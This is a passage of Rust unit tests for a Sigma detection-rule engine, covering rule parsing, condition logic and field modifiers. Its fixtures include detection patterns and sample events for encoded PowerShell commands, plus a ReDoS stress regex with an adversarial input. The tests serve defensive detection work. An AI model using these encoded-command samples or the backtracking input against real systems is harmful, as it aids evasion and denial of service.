// =============================================================================
// Sigma Rule Engine — Comprehensive Tests
// =============================================================================
// Every modifier, every condition pattern, every edge case. Adversaries don't
// attack the obvious paths — they probe edge cases. Every untested path is an
// open door.
// =============================================================================

#[cfg(test)]
mod tests {
    use null_sigma::*;
    use std::collections::HashMap;

    // ═════════════════════════════════════════════════════════════════════
    // PARSER TESTS — YAML → SigmaRule
    // ═════════════════════════════════════════════════════════════════════

    mod parser_tests {
        use super::*;

        #[test]
        fn parse_minimal_valid_rule() {
            let yaml = r#"
title: Test Rule
logsource:
    category: test
detection:
    selection:
        field: value
    condition: selection
"#;
            let (rule, identifiers) = parse_rule(yaml).unwrap();
            assert_eq!(rule.title, "Test Rule");
            assert_eq!(identifiers.len(), 1);
            assert_eq!(identifiers[0].name, "selection");
        }

        #[test]
        fn parse_full_rule_all_fields() {
            let yaml = r#"
title: Full Test Rule
id: 12345678-1234-1234-1234-123456789abc
status: stable
level: high
description: A full test rule with all fields
author: Test Author
date: 2026/03/15
references:
    - https://example.com
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
    service: sysmon
detection:
    selection:
        CommandLine|contains: '-enc'
    condition: selection
falsepositives:
    - Legitimate admin PowerShell usage
"#;
            let (rule, _) = parse_rule(yaml).unwrap();
            assert_eq!(rule.id, "12345678-1234-1234-1234-123456789abc");
            assert_eq!(rule.status, RuleStatus::Stable);
            assert_eq!(rule.level, SeverityLevel::High);
            assert_eq!(rule.author, "Test Author");
            assert_eq!(rule.tags.len(), 2);
            assert!(rule.tags.contains(&"attack.execution".to_string()));
            assert_eq!(rule.falsepositives.len(), 1);
            assert_eq!(
                rule.logsource.category,
                Some("process_creation".to_string())
            );
            assert_eq!(rule.logsource.product, Some("windows".to_string()));
            assert_eq!(rule.logsource.service, Some("sysmon".to_string()));
        }

        #[test]
        fn parse_auto_generates_id() {
            let yaml = r#"
title: No ID Rule
logsource:
    category: test
detection:
    selection:
        field: value
    condition: selection
"#;
            let (rule, _) = parse_rule(yaml).unwrap();
            assert!(!rule.id.is_empty());
            // Same title should generate same ID (deterministic)
            let (rule2, _) = parse_rule(yaml).unwrap();
            assert_eq!(rule.id, rule2.id);
        }

        #[test]
        fn parse_multiple_search_identifiers() {
            let yaml = r#"
title: Multi Identifier Rule
logsource:
    category: test
detection:
    selection:
        CommandLine|contains: '-enc'
    filter:
        User: 'SYSTEM'
    condition: selection and not filter
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            assert_eq!(identifiers.len(), 2);
            let names: Vec<&str> = identifiers.iter().map(|i| i.name.as_str()).collect();
            assert!(names.contains(&"selection"));
            assert!(names.contains(&"filter"));
        }

        #[test]
        fn parse_list_of_values_keyword_search() {
            // When detection uses a list of bare strings, it becomes a keyword search
            let yaml = r#"
title: Keyword Search Rule
logsource:
    category: test
detection:
    keywords:
        - 'suspicious'
        - 'malware'
        - 'hack'
    condition: keywords
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            assert_eq!(identifiers.len(), 1);
            let kw = &identifiers[0];
            assert_eq!(kw.name, "keywords");
            // Keywords should have empty field names (match any field)
            assert!(kw
                .groups
                .iter()
                .all(|g| g.conditions.iter().all(|c| c.field.is_empty())));
        }

        #[test]
        fn parse_list_of_maps_or_groups() {
            // A list of maps creates OR-ed groups
            let yaml = r#"
title: List of Maps Rule
logsource:
    category: test
detection:
    selection:
        - CommandLine|contains: 'powershell'
          User: 'admin'
        - CommandLine|contains: 'cmd'
          User: 'SYSTEM'
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let sel = &identifiers[0];
            // Should have 2 OR-ed groups
            assert_eq!(sel.groups.len(), 2);
            // Each group should have 2 AND-ed conditions
            assert_eq!(sel.groups[0].conditions.len(), 2);
            assert_eq!(sel.groups[1].conditions.len(), 2);
        }

        #[test]
        fn parse_multiple_values_per_field() {
            let yaml = r#"
title: Multiple Values Rule
logsource:
    category: test
detection:
    selection:
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
            - '-ec'
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let sel = &identifiers[0];
            assert_eq!(sel.groups[0].conditions.len(), 1);
            // Should have 3 values (OR-ed)
            assert_eq!(sel.groups[0].conditions[0].values.len(), 3);
        }

        #[test]
        fn parse_modifiers_complex() {
            let yaml = r#"
title: Complex Modifiers
logsource:
    category: test
detection:
    selection:
        CommandLine|contains|all:
            - '-enc'
            - 'powershell'
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let cond = &identifiers[0].groups[0].conditions[0];
            assert!(cond.modifiers.contains(&ValueModifier::Contains));
            assert!(cond.modifiers.contains(&ValueModifier::All));
        }

        #[test]
        fn parse_multi_document_yaml() {
            let yaml = r#"
title: Rule 1
logsource:
    category: test
detection:
    selection:
        field: value1
    condition: selection
---
title: Rule 2
logsource:
    category: test
detection:
    selection:
        field: value2
    condition: selection
"#;
            let results = parse_rules(yaml);
            assert_eq!(results.len(), 2);
            assert!(results.iter().all(|r| r.is_ok()));
        }

        #[test]
        fn parse_severity_levels() {
            for (level_str, expected) in [
                ("informational", SeverityLevel::Informational),
                ("low", SeverityLevel::Low),
                ("medium", SeverityLevel::Medium),
                ("high", SeverityLevel::High),
                ("critical", SeverityLevel::Critical),
            ] {
                let yaml = format!(
                    "title: Test\nlevel: {}\nlogsource:\n    category: test\ndetection:\n    sel:\n        f: v\n    condition: sel\n",
                    level_str
                );
                let (rule, _) = parse_rule(&yaml).unwrap();
                assert_eq!(rule.level, expected, "Failed for level: {level_str}");
            }
        }

        #[test]
        fn parse_rule_statuses() {
            let cases = [
                ("experimental", RuleStatus::Experimental),
                ("test", RuleStatus::Test),
                ("stable", RuleStatus::Stable),
                ("deprecated", RuleStatus::Deprecated),
                ("unsupported", RuleStatus::Unsupported),
            ];
            for (status_str, expected) in cases {
                let yaml = format!(
                    "title: Test\nstatus: {}\nlogsource:\n    category: test\ndetection:\n    sel:\n        f: v\n    condition: sel\n",
                    status_str
                );
                let (rule, _) = parse_rule(&yaml).unwrap();
                assert_eq!(rule.status, expected, "Failed for status: {status_str}");
            }
        }

        #[test]
        fn parse_error_missing_title() {
            let yaml = r#"
logsource:
    category: test
detection:
    selection:
        field: value
    condition: selection
"#;
            let result = parse_rule(yaml);
            assert!(result.is_err());
        }

        #[test]
        fn parse_error_missing_detection() {
            let yaml = r#"
title: No Detection
logsource:
    category: test
"#;
            let result = parse_rule(yaml);
            assert!(result.is_err());
        }

        #[test]
        fn parse_numeric_and_boolean_values() {
            let yaml = r#"
title: Typed Values
logsource:
    category: test
detection:
    selection:
        count|gte: 10
        enabled: true
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let group = &identifiers[0].groups[0];
            // Should handle integer and boolean values
            assert!(!group.conditions.is_empty());
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // CONDITION COMPILER TESTS — String → AST
    // ═════════════════════════════════════════════════════════════════════

    mod condition_tests {
        use super::*;

        fn make_identifiers(names: &[&str]) -> Vec<SearchIdentifier> {
            names
                .iter()
                .map(|n| SearchIdentifier {
                    name: n.to_string(),
                    groups: vec![],
                })
                .collect()
        }

        #[test]
        fn compile_simple_identifier() {
            let ids = make_identifiers(&["selection"]);
            let node = compile_condition("selection", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("selection".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_and() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            let node = compile_condition("sel1 and sel2", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), true);
            results.insert("sel2".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_or() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            let node = compile_condition("sel1 or sel2", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), false);
            results.insert("sel2".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_not() {
            let ids = make_identifiers(&["filter"]);
            let node = compile_condition("not filter", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("filter".to_string(), true);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_selection_and_not_filter() {
            // Most common Sigma pattern
            let ids = make_identifiers(&["selection", "filter"]);
            let node = compile_condition("selection and not filter", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("filter".to_string(), true);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_parenthesized_or_and_not() {
            let ids = make_identifiers(&["sel_a", "sel_b", "filter"]);
            let node = compile_condition("(sel_a or sel_b) and not filter", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel_a".to_string(), false);
            results.insert("sel_b".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("sel_b".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_nested_parens() {
            let ids = make_identifiers(&["a", "b", "c", "d"]);
            let node = compile_condition("(a and b) or (c and d)", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("a".to_string(), true);
            results.insert("b".to_string(), true);
            results.insert("c".to_string(), false);
            results.insert("d".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("a".to_string(), false);
            results.insert("c".to_string(), true);
            results.insert("d".to_string(), true);
            assert!(node.evaluate(&results));
        }

        #[test]
        fn compile_1_of_them() {
            let ids = make_identifiers(&["sel1", "sel2", "sel3"]);
            let node = compile_condition("1 of them", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), false);
            results.insert("sel2".to_string(), true);
            results.insert("sel3".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_all_of_them() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            let node = compile_condition("all of them", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), true);
            results.insert("sel2".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_1_of_wildcard_pattern() {
            let ids = make_identifiers(&["selection_proc", "selection_cmd", "filter"]);
            let node = compile_condition("1 of selection*", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection_proc".to_string(), false);
            results.insert("selection_cmd".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));
        }

        #[test]
        fn compile_all_of_wildcard() {
            let ids = make_identifiers(&["sel_a", "sel_b", "filter"]);
            let node = compile_condition("all of sel*", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel_a".to_string(), true);
            results.insert("sel_b".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("sel_b".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_complex_condition_with_quantifier() {
            let ids = make_identifiers(&["selection_1", "selection_2", "filter"]);
            let node = compile_condition("1 of selection* and not filter", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection_1".to_string(), true);
            results.insert("selection_2".to_string(), false);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));
        }

        #[test]
        fn compile_2_of_wildcard_requires_two_matches() {
            // `2 of selection*` — need at least 2 of the 3 to fire
            let ids = make_identifiers(&["selection_1", "selection_2", "selection_3"]);
            let node = compile_condition("2 of selection*", &ids).unwrap();

            // Only one match → should NOT fire
            let mut results = HashMap::new();
            results.insert("selection_1".to_string(), true);
            results.insert("selection_2".to_string(), false);
            results.insert("selection_3".to_string(), false);
            assert!(!node.evaluate(&results), "2 of 3 requires ≥2 matches");

            // Two match → should fire
            results.insert("selection_2".to_string(), true);
            assert!(
                node.evaluate(&results),
                "2 of 3 with exactly 2 true should fire"
            );
        }

        #[test]
        fn compile_3_of_them_through_full_rule_parse() {
            // End-to-end: parse_rule must not reject `3 of selection*`
            let yaml = r#"
title: Three Of Quantifier Rule
logsource: {}
detection:
    selection_a:
        Field1|contains: 'alpha'
    selection_b:
        Field2|contains: 'beta'
    selection_c:
        Field3|contains: 'gamma'
    condition: 3 of selection*
"#;
            let result = parse_rule(yaml);
            assert!(
                result.is_ok(),
                "parse_rule must accept `3 of selection*`: {result:?}"
            );

            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // All three fields present → matches
            let mut event = HashMap::new();
            event.insert("Field1".to_string(), "alpha content".to_string());
            event.insert("Field2".to_string(), "beta content".to_string());
            event.insert("Field3".to_string(), "gamma content".to_string());
            assert_eq!(engine.evaluate_event(&event).len(), 1);

            // Only two fields present → no match (needs all 3)
            event.remove("Field3");
            assert_eq!(engine.evaluate_event(&event).len(), 0);
        }

        #[test]
        fn compile_empty_condition_error() {
            let ids = make_identifiers(&["sel"]);
            let result = compile_condition("", &ids);
            assert!(result.is_err());
        }

        #[test]
        fn reject_trailing_and_invalid_condition_input() {
            let ids = make_identifiers(&["selection"]);
            for condition in [
                "selection trailing",
                "selection)",
                "selection @",
                "selection | count() > 5",
            ] {
                assert!(
                    compile_condition(condition, &ids).is_err(),
                    "malformed condition should be rejected: {condition}"
                );
            }
        }

        #[test]
        fn reject_malformed_explicit_quantifier_lists() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            for condition in [
                "1 of ()",
                "1 of (sel1,)",
                "1 of (,sel1)",
                "1 of (sel1,,sel2)",
                "1 of (sel1 sel2)",
                "1 of (sel1, sel2",
            ] {
                assert!(
                    compile_condition(condition, &ids).is_err(),
                    "malformed quantifier list should be rejected: {condition}"
                );
            }
        }

        #[test]
        fn reject_duplicate_explicit_quantifier_members() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            for condition in ["1 of (sel1, sel1)", "1 of (sel*, sel1)"] {
                assert!(
                    compile_condition(condition, &ids).is_err(),
                    "duplicate quantifier members should be rejected: {condition}"
                );
            }
        }

        #[test]
        fn compile_operator_precedence() {
            // NOT > AND > OR
            let ids = make_identifiers(&["a", "b", "c"]);
            // "a or b and c" should be "a or (b and c)"
            let node = compile_condition("a or b and c", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("a".to_string(), true);
            results.insert("b".to_string(), false);
            results.insert("c".to_string(), false);
            // a=true, so "a or (false and false)" = true
            assert!(node.evaluate(&results));

            results.insert("a".to_string(), false);
            results.insert("b".to_string(), true);
            results.insert("c".to_string(), true);
            // "false or (true and true)" = true
            assert!(node.evaluate(&results));

            results.insert("c".to_string(), false);
            // "false or (true and false)" = false
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_double_not() {
            let ids = make_identifiers(&["sel"]);
            let node = compile_condition("not not sel", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel".to_string(), true);
            assert!(node.evaluate(&results));
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // MATCHER TESTS — Event matching with all modifiers
    // ═════════════════════════════════════════════════════════════════════

    mod matcher_tests {
        use super::*;

        fn make_event(pairs: &[(&str, &str)]) -> HashMap<String, String> {
            pairs
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect()
        }

        fn make_condition(field: &str, values: &[&str], mods: &[ValueModifier]) -> FieldCondition {
            FieldCondition {
                field: field.to_string(),
                field_folded: field.to_lowercase(),
                values: values
                    .iter()
                    .map(|v| SigmaValue::String(v.to_string()))
                    .collect(),
                values_folded: values.iter().map(|v| Some(v.to_lowercase())).collect(),
                values_match_cache: Vec::new(),
                modifiers: mods.to_vec(),
            }
        }

        fn make_identifier(name: &str, conditions: Vec<FieldCondition>) -> SearchIdentifier {
            SearchIdentifier {
                name: name.to_string(),
                groups: vec![FieldConditionGroup { conditions }],
            }
        }

        // ─── Default (exact) matching ───────────────────────────────────

        #[test]
        fn exact_match_case_insensitive() {
            let event = make_event(&[("field", "PowerShell")]);
            let cond = make_condition("field", &["powershell"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_no_match() {
            let event = make_event(&[("field", "cmd.exe")]);
            let cond = make_condition("field", &["powershell"], &[]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_with_wildcard() {
            let event = make_event(&[("image", "C:\\Windows\\System32\\cmd.exe")]);
            let cond = make_condition("image", &["*\\cmd.exe"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_wildcard_question_mark() {
            let event = make_event(&[("field", "test1")]);
            let cond = make_condition("field", &["test?"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_multiple_values_or() {
            let event = make_event(&[("field", "cmd")]);
            let cond = make_condition("field", &["powershell", "cmd", "bash"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Contains modifier ──────────────────────────────────────────

        #[test]
        fn contains_modifier() {
            let event = make_event(&[("cmd", "powershell -encodedcommand AAAA")]);
            let cond = make_condition("cmd", &["-encodedcommand"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn contains_modifier_no_match() {
            let event = make_event(&[("cmd", "notepad.exe")]);
            let cond = make_condition("cmd", &["powershell"], &[ValueModifier::Contains]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn contains_case_insensitive() {
            let event = make_event(&[("cmd", "PowerShell -EncodedCommand")]);
            let cond = make_condition("cmd", &["-encodedcommand"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Contains|all modifier ──────────────────────────────────────

        #[test]
        fn contains_all_modifier() {
            let event = make_event(&[("cmd", "powershell -enc -nop -sta")]);
            let cond = make_condition(
                "cmd",
                &["-enc", "-nop"],
                &[ValueModifier::Contains, ValueModifier::All],
            );
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn contains_all_modifier_partial_match() {
            let event = make_event(&[("cmd", "powershell -enc something")]);
            let cond = make_condition(
                "cmd",
                &["-enc", "-nop"],
                &[ValueModifier::Contains, ValueModifier::All],
            );
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── StartsWith modifier ────────────────────────────────────────

        #[test]
        fn startswith_modifier() {
            let event = make_event(&[("path", "C:\\Windows\\System32\\evil.exe")]);
            let cond = make_condition("path", &["C:\\Windows"], &[ValueModifier::StartsWith]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn startswith_no_match() {
            let event = make_event(&[("path", "D:\\App\\something.exe")]);
            let cond = make_condition("path", &["C:\\Windows"], &[ValueModifier::StartsWith]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── EndsWith modifier ──────────────────────────────────────────

        #[test]
        fn endswith_modifier() {
            let event = make_event(&[("image", "C:\\Windows\\System32\\powershell.exe")]);
            let cond = make_condition("image", &["\\powershell.exe"], &[ValueModifier::EndsWith]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn endswith_no_match() {
            let event = make_event(&[("image", "C:\\App\\notepad.exe")]);
            let cond = make_condition("image", &["\\powershell.exe"], &[ValueModifier::EndsWith]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Regex modifier ────────────────────────────────────────────

        #[test]
        fn regex_modifier() {
            let event = make_event(&[("cmd", "cmd /c echo test123")]);
            let cond = make_condition("cmd", &["test\\d+"], &[ValueModifier::Regex]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_case_insensitive_default() {
            let event = make_event(&[("cmd", "PowerShell -Version 2")]);
            let cond = make_condition("cmd", &["powershell.*version"], &[ValueModifier::Regex]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_no_match() {
            let event = make_event(&[("cmd", "notepad.exe")]);
            let cond = make_condition("cmd", &["powershell\\s+-enc"], &[ValueModifier::Regex]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_invalid_pattern_no_crash() {
            let event = make_event(&[("cmd", "test")]);
            let cond = make_condition("cmd", &["[invalid"], &[ValueModifier::Regex]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_rule_uses_precompiled_cache_end_to_end() {
            // A rule with |re should compile regexes at load time and use them
            // for every subsequent evaluate_event call — not re-compile per event.
            // This test validates that the engine routes |re rules through
            // match_identifier_with_cache and that results are correct.
            let yaml = r#"
title: Regex Cache Test
logsource: {}
detection:
    sel:
        CommandLine|re: 'powershell\s+-(enc|encodedcommand)\s+'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let matching = [
                "C:\\> powershell -enc SQBFAFgA",
                "powershell  -enc   base64here",
                "POWERSHELL -ENCODEDCOMMAND abc",
            ];
            for cmd in &matching {
                let mut event = HashMap::new();
                event.insert("CommandLine".to_string(), (*cmd).to_string());
                assert_eq!(
                    engine.evaluate_event(&event).len(),
                    1,
                    "should fire on: {cmd}"
                );
            }

            let non_matching = ["powershell -File script.ps1", "cmd.exe /c echo hello", ""];
            for cmd in &non_matching {
                let mut event = HashMap::new();
                event.insert("CommandLine".to_string(), (*cmd).to_string());
                assert_eq!(
                    engine.evaluate_event(&event).len(),
                    0,
                    "should NOT fire on: {cmd}"
                );
            }
        }

        /// Prove Rust's `regex` crate cannot be ReDoS'd.
        ///
        /// The `regex` crate uses a linear-time NFA — it does not backtrack.
        /// A classically catastrophic pattern like `(a+)+$` that causes
        /// exponential blowup in backtracking engines completes in O(n) here
        /// regardless of input length.
        ///
        /// This test makes the guarantee executable: if a future dependency
        /// swap introduces a backtracking evaluator, this test will hang and
        /// the CI timeout will catch it.
        #[test]
        fn regex_linear_time_no_redos() {
            // `(a+)+$` is the canonical ReDoS pattern.
            // On a backtracking engine, "aaa...ab" causes 2^n backtracks.
            // On Rust's NFA engine it runs in O(n).
            let yaml = r#"
title: ReDoS Stress Test
logsource: {}
detection:
    sel:
        Field|re: '(a+)+$'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // 10 000 'a's followed by 'b' — the adversarial non-matching input
            // that maximises backtracking in vulnerable engines.
            let adversarial = "a".repeat(10_000) + "b";
            let mut event = HashMap::new();
            event.insert("Field".to_string(), adversarial);

            let deadline = std::time::Instant::now();
            let _ = engine.evaluate_event(&event);
            let elapsed = deadline.elapsed();

            assert!(
                elapsed.as_millis() < 500,
                "regex evaluation took {}ms — possible ReDoS regression (expected <500ms)",
                elapsed.as_millis()
            );
        }

        // ─── Regex flag sub-modifiers (|re|i, |re|m, |re|s) ─────────────

        /// `re|i` — explicit case-insensitive flag. The engine is already
        /// case-insensitive by default for |re, so this must load AND match.
        #[test]
        fn regex_i_flag_loads_and_matches() {
            let event = make_event(&[("cmd", "Copy C:\\Windows\\System32\\cmd.exe")]);
            let cond = make_condition(
                "cmd",
                &["c:\\\\windows\\\\system32"],
                &[ValueModifier::Regex, ValueModifier::RegexI],
            );
            assert!(match_field_condition(&cond, &event));
        }

        /// `re|m` — `^`/`$` anchor at line breaks, not just string ends.
        #[test]
        fn regex_m_flag_multiline_anchors() {
            let event = make_event(&[("log", "line one\nEVIL start\nline three")]);
            let cond = make_condition(
                "log",
                &["^evil"],
                &[ValueModifier::Regex, ValueModifier::RegexM],
            );
            assert!(match_field_condition(&cond, &event));

            // Without |m the mid-string `^` must NOT match.
            let cond_no_m = make_condition("log", &["^evil"], &[ValueModifier::Regex]);
            assert!(!match_field_condition(&cond_no_m, &event));
        }

        /// `re|s` — `.` matches newlines (dot-all mode).
        #[test]
        fn regex_s_flag_dot_matches_newline() {
            let event = make_event(&[("log", "start\nmiddle\nend")]);
            let cond = make_condition(
                "log",
                &["start.+end"],
                &[ValueModifier::Regex, ValueModifier::RegexS],
            );
            assert!(match_field_condition(&cond, &event));

            // Without |s the `.` must not cross line boundaries.
            let cond_no_s = make_condition("log", &["start.+end"], &[ValueModifier::Regex]);
            assert!(!match_field_condition(&cond_no_s, &event));
        }

        /// A bare `|i` flag without a preceding `|re` is a parse error —
        /// flags are not standalone match modes.
        #[test]
        fn regex_flag_without_re_is_parse_error() {
            let yaml = r#"
title: Bare Flag Rule
logsource: {}
detection:
    sel:
        CommandLine|i: 'foo'
    condition: sel
"#;
            assert!(
                parse_rule(yaml).is_err(),
                "Bare |i without |re must be rejected at parse time"
            );
        }

        /// End-to-end: the real SigmaHQ corpus shape `field|re|i: pattern`
        /// loads and matches through the engine's regex cache path.
        #[test]
        fn regex_i_flag_through_engine_cache_path() {
            let yaml = r#"
title: Corpus Shape re|i
logsource: {}
detection:
    sel:
        CommandLine|re|i: '\s[''"]?c:\\windows\\(?:system32|syswow64)'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "CommandLine".to_string(),
                "copy \"C:\\Windows\\System32\\cmd.exe\" dest".to_string(),
            );
            assert_eq!(engine.evaluate_event(&event).len(), 1);

            let mut event2 = HashMap::new();
            event2.insert(
                "CommandLine".to_string(),
                "copy harmless.txt dest".to_string(),
            );
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        // ─── FieldRef modifier ──────────────────────────────────────────

        /// `Image|fieldref: ParentImage` — equality against another field.
        #[test]
        fn fieldref_equal_match() {
            let event = make_event(&[
                ("Image", "C:\\Windows\\explorer.exe"),
                ("ParentImage", "C:\\Windows\\explorer.exe"),
            ]);
            let cond = make_condition("Image", &["ParentImage"], &[ValueModifier::FieldRef]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn fieldref_equal_no_match() {
            let event = make_event(&[
                ("Image", "C:\\Windows\\explorer.exe"),
                ("ParentImage", "C:\\Windows\\services.exe"),
            ]);
            let cond = make_condition("Image", &["ParentImage"], &[ValueModifier::FieldRef]);
            assert!(!match_field_condition(&cond, &event));
        }

        /// Field-name comparison is case-insensitive like the rest of the engine.
        #[test]
        fn fieldref_case_insensitive_values_and_names() {
            let event = make_event(&[
                ("image", "C:\\App\\RUN.EXE"),
                ("parentimage", "c:\\app\\run.exe"),
            ]);
            let cond = make_condition("Image", &["ParentImage"], &[ValueModifier::FieldRef]);
            assert!(match_field_condition(&cond, &event));
        }

        /// `fieldref|contains` — substring comparison between two fields.
        #[test]
        fn fieldref_contains() {
            let event = make_event(&[
                ("CommandLine", "cmd /c C:\\tools\\evil.exe -x"),
                ("Image", "C:\\tools\\evil.exe"),
            ]);
            let cond = make_condition(
                "CommandLine",
                &["Image"],
                &[ValueModifier::FieldRef, ValueModifier::Contains],
            );
            assert!(match_field_condition(&cond, &event));
        }

        /// Missing referenced field never matches.
        #[test]
        fn fieldref_missing_referenced_field_no_match() {
            let event = make_event(&[("Image", "C:\\Windows\\explorer.exe")]);
            let cond = make_condition("Image", &["ParentImage"], &[ValueModifier::FieldRef]);
            assert!(!match_field_condition(&cond, &event));
        }

        /// Missing subject field never matches.
        #[test]
        fn fieldref_missing_subject_field_no_match() {
            let event = make_event(&[("ParentImage", "C:\\Windows\\explorer.exe")]);
            let cond = make_condition("Image", &["ParentImage"], &[ValueModifier::FieldRef]);
            assert!(!match_field_condition(&cond, &event));
        }

        /// Wildcard characters in event data must compare LITERALLY under
        /// fieldref — the referenced value is data, not a pattern.
        #[test]
        fn fieldref_event_data_wildcards_are_literal() {
            let event = make_event(&[("a", "anything-here"), ("b", "*")]);
            let cond = make_condition("a", &["b"], &[ValueModifier::FieldRef]);
            assert!(
                !match_field_condition(&cond, &event),
                "A literal '*' in event data must not act as a wildcard"
            );

            let event2 = make_event(&[("a", "*"), ("b", "*")]);
            assert!(match_field_condition(&cond, &event2));
        }

        /// End-to-end through the engine: the SigmaHQ corpus shape
        /// `ParentImage|fieldref: Image` (process executing itself).
        #[test]
        fn fieldref_through_engine() {
            let yaml = r#"
title: Parent Executes Itself
logsource: {}
detection:
    selection:
        ParentImage|fieldref: Image
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let mut event = HashMap::new();
            event.insert("Image".to_string(), "C:\\app\\worker.exe".to_string());
            event.insert("ParentImage".to_string(), "C:\\app\\worker.exe".to_string());
            assert_eq!(engine.evaluate_event(&event).len(), 1);

            let mut event2 = HashMap::new();
            event2.insert("Image".to_string(), "C:\\app\\worker.exe".to_string());
            event2.insert(
                "ParentImage".to_string(),
                "C:\\Windows\\explorer.exe".to_string(),
            );
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        // ─── CIDR modifier ─────────────────────────────────────────────

        #[test]
        fn cidr_match_ipv4() {
            let event = make_event(&[("src_ip", "192.168.1.50")]);
            let cond = make_condition("src_ip", &["192.168.1.0/24"], &[ValueModifier::Cidr]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn cidr_no_match_ipv4() {
            let event = make_event(&[("src_ip", "10.0.0.1")]);
            let cond = make_condition("src_ip", &["192.168.1.0/24"], &[ValueModifier::Cidr]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn cidr_match_ipv6() {
            let event = make_event(&[("src_ip", "2001:db8::1")]);
            let cond = make_condition("src_ip", &["2001:db8::/32"], &[ValueModifier::Cidr]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn cidr_invalid_no_crash() {
            let event = make_event(&[("src_ip", "not_an_ip")]);
            let cond = make_condition("src_ip", &["192.168.1.0/24"], &[ValueModifier::Cidr]);
            assert!(!match_field_condition(&cond, &event));
        }

